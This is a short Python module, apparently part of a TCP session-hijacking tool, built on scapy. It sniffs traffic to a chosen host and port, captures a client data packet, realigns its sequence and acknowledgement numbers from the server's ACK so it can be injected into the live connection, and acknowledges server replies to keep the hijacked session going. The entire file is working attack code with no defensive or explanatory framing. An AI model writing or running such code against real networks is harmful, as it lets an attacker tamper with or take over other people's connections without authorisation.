from scapy.all import *
import time
import threading
from libs import packet as lpacket

class sniff_settings:
    running = True
    src = ""
    dst = ""
    prt = 0
    sniff_stop = threading.Event()
    injected = False

injection_packet = None
current_response = None
class sniffer:
    def sniff(pkt):
        global sniff_settings, injection_packet, current_response

        if pkt[TCP].flags == "PA" and pkt[IP].dst == sniff_settings.dst and sniff_settings.injected == False: 
            injection_packet = pkt
        elif pkt[TCP].flags == "A" and pkt[IP].src == sniff_settings.dst and injection_packet != None:
            injection_packet.seq = pkt.ack
            injection_packet.ack = pkt.seq
            sniff_settings.injected = True
        elif pkt[TCP].flags == "PA" and pkt[IP].src == sniff_settings.dst and sniff_settings.injected:
            current_response = pkt
            send(lpacket.create_ack(pkt), verbose=False)

    def __init__(self):
        global sniff_settings
        sniff(prn=sniffer.sniff, filter=f"host {sniff_settings.dst} and tcp port {sniff_settings.prt}", stop_filter=lambda p: sniff_settings.sniff_stop.is_set())
        sniff_settings.running = False 

def stop_sniffing():
    global sniff_settings
    sniff_settings.sniff_stop.set()

def start_sniffing(src_ip, dst_ip, dst_prt):
    global sniff_settings
    sniff_settings.src = src_ip
    sniff_settings.dst = dst_ip
    sniff_settings.prt = dst_prt
    threading.Thread(target=sniffer).start()
    while not sniff_settings.injected:
        time.sleep(0.5)